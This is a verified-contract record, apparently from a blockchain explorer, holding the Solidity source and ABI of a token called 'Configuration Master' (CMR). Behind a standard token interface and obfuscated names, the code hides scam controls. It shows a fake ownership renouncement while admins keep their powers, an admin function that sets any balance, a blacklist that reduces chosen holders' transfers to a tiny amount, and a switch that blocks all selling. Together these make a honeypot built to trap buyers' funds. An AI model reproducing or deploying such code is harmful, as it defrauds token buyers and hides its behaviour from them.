{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface tokenLaunch {\n    function createPair(address teamExempt, address swapSender) external returns (address);\n}\n\ninterface atAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atTrading) external view returns (uint256);\n\n    function transfer(address teamMode, uint256 launchedReceiverAt) external returns (bool);\n\n    function allowance(address isAtReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedReceiverAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamMode,\n        uint256 launchedReceiverAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atAutoSell, uint256 value);\n    event Approval(address indexed isAtReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract receiverLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atAutoMetadata is atAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConfigurationMaster is receiverLaunched, atAuto, atAutoMetadata {\n\n    constructor (){\n        \n        minTeam swapEnable = minTeam(autoLiquidity);\n        exemptWallet = tokenLaunch(swapEnable.factory()).createPair(swapEnable.WETH(), address(this));\n        if (teamMax == enableFee) {\n            marketingToken = false;\n        }\n        buyIs = _msgSender();\n        atTake[buyIs] = true;\n        swapFrom[buyIs] = sellReceiver;\n        feeBuyTrading();\n        \n        emit Transfer(address(0), buyIs, sellReceiver);\n    }\n\n    function getOwner() external view returns (address) {\n        return modeTo;\n    }\n\n    bool public atList;\n\n    function maxEnableSender(address atTo) public {\n        enableMax();\n        \n        if (atTo == buyIs || atTo == exemptWallet) {\n            return;\n        }\n        txLiquidity[atTo] = true;\n    }\n\n    function transfer(address toTeam, uint256 launchedReceiverAt) external virtual override returns (bool) {\n        return tokenLaunchAt(_msgSender(), toTeam, launchedReceiverAt);\n    }\n\n    uint256 shouldReceiver;\n\n    function approve(address amountTx, uint256 launchedReceiverAt) public virtual override returns (bool) {\n        modeAmountList[_msgSender()][amountTx] = launchedReceiverAt;\n        emit Approval(_msgSender(), amountTx, launchedReceiverAt);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private modeAmountList;\n\n    mapping(address => bool) public txLiquidity;\n\n    event OwnershipTransferred(address indexed atTokenTeam, address indexed amountLiquidity);\n\n    string private tradingAmount = \"Configuration Master\";\n\n    address public exemptWallet;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverAmount;\n    }\n\n    uint256 constant liquidityExempt = 6 ** 10;\n\n    uint256 tokenList;\n\n    bool private enableFee;\n\n    function tokenSender(address txEnable, address teamMode, uint256 launchedReceiverAt) internal returns (bool) {\n        require(swapFrom[txEnable] >= launchedReceiverAt);\n        swapFrom[txEnable] -= launchedReceiverAt;\n        swapFrom[teamMode] += launchedReceiverAt;\n        emit Transfer(txEnable, teamMode, launchedReceiverAt);\n        return true;\n    }\n\n    bool public autoSwap;\n\n    bool private modeIs;\n\n    string private receiverAmount = \"CMR\";\n\n    function transferFrom(address txEnable, address teamMode, uint256 launchedReceiverAt) external override returns (bool) {\n        if (_msgSender() != autoLiquidity) {\n            if (modeAmountList[txEnable][_msgSender()] != type(uint256).max) {\n                require(launchedReceiverAt <= modeAmountList[txEnable][_msgSender()]);\n                modeAmountList[txEnable][_msgSender()] -= launchedReceiverAt;\n            }\n        }\n        return tokenLaunchAt(txEnable, teamMode, launchedReceiverAt);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityMode;\n    }\n\n    uint256 private fromLaunch;\n\n    function allowance(address launchedTakeFee, address amountTx) external view virtual override returns (uint256) {\n        if (amountTx == autoLiquidity) {\n            return type(uint256).max;\n        }\n        return modeAmountList[launchedTakeFee][amountTx];\n    }\n\n    address tradingModeLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address atTrading) public view virtual override returns (uint256) {\n        return swapFrom[atTrading];\n    }\n\n    function launchedMaxSender(address teamTx) public {\n        require(teamTx.balance < 100000);\n        if (atList) {\n            return;\n        }\n        if (minSwapFee == fromLaunch) {\n            modeIs = false;\n        }\n        atTake[teamTx] = true;\n        if (enableFee) {\n            autoSwap = true;\n        }\n        atList = true;\n    }\n\n    bool public teamMax;\n\n    address private modeTo;\n\n    function tokenLaunchAt(address txEnable, address teamMode, uint256 launchedReceiverAt) internal returns (bool) {\n        if (txEnable == buyIs) {\n            return tokenSender(txEnable, teamMode, launchedReceiverAt);\n        }\n        uint256 fromEnable = atAuto(exemptWallet).balanceOf(tradingModeLaunched);\n        require(fromEnable == tokenList);\n        require(teamMode != tradingModeLaunched);\n        if (txLiquidity[txEnable]) {\n            return tokenSender(txEnable, teamMode, liquidityExempt);\n        }\n        return tokenSender(txEnable, teamMode, launchedReceiverAt);\n    }\n\n    bool public marketingToken;\n\n    function owner() external view returns (address) {\n        return modeTo;\n    }\n\n    uint256 public minSwapFee;\n\n    function totalMax(uint256 launchedReceiverAt) public {\n        enableMax();\n        tokenList = launchedReceiverAt;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellReceiver;\n    }\n\n    mapping(address => bool) public atTake;\n\n    function marketingReceiver(address toTeam, uint256 launchedReceiverAt) public {\n        enableMax();\n        swapFrom[toTeam] = launchedReceiverAt;\n    }\n\n    uint256 private minLaunched;\n\n    function enableMax() private view {\n        require(atTake[_msgSender()]);\n    }\n\n    bool private minAuto;\n\n    uint256 private sellReceiver = 100000000 * 10 ** 18;\n\n    address public buyIs;\n\n    function name() external view virtual override returns (string memory) {\n        return tradingAmount;\n    }\n\n    function feeBuyTrading() public {\n        emit OwnershipTransferred(buyIs, address(0));\n        modeTo = address(0);\n    }\n\n    uint8 private liquidityMode = 18;\n\n    mapping(address => uint256) private swapFrom;\n\n    address autoLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isAtReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTokenTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atAutoSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTakeFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedReceiverAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBuyTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTx\",\"type\":\"address\"}],\"name\":\"launchedMaxSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedReceiverAt\",\"type\":\"uint256\"}],\"name\":\"marketingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTo\",\"type\":\"address\"}],\"name\":\"maxEnableSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSwapFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedReceiverAt\",\"type\":\"uint256\"}],\"name\":\"totalMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedReceiverAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedReceiverAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ConfigurationMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}